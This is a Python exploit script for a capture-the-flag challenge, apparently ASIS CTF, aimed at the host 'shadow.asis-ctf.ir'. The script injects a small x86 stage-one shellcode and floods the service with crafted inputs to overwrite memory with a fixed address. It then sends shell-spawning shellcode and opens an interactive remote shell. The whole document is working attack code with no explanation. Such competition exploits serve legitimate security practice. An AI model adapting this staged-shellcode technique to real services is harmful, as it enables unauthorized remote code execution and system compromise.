import socket
import time
import telnetlib
import struct
# from https://github.com/niklasb/ctf-tools/tree/master/pwnlib
import pwnlib.tools as t

TARGET=('shadow.asis-ctf.ir', 31337)
WAIT=1

s=socket.create_connection(TARGET)
def ru(st):
    buf=''
    while not st in buf:
        c=s.recv(1)
        assert c
        buf += c
    return buf

def interact():
    t = telnetlib.Telnet()
    t.sock=s
    t.interact()

def p(x):
    return struct.pack('<I', x)

stage1 = t.x86.assemble('''
    mov ebp, esp
    mov eax, 3
    mov ebx, 0
    mov ecx, ebp
    mov edx, 100
    int 0x80
    jmp ebp
''')
assert not any(c in stage1 for c in '\n\t\r ')

s.sendall('%s\n' % stage1)
s.sendall('1\n')
s.sendall('%d\n' % 0x30000)
s.sendall('a'*0x30000)
time.sleep(WAIT)

s.sendall('2\n')
s.sendall('0\n')
n = 0x60000//4 + 1015
for i in range(n):
    s.sendall('a\n')

s.sendall('y\n')
s.sendall(p(0x0804a520)* 10)
time.sleep(WAIT)

s.sendall(t.x86_shellcode.shell)
time.sleep(WAIT)
interact()
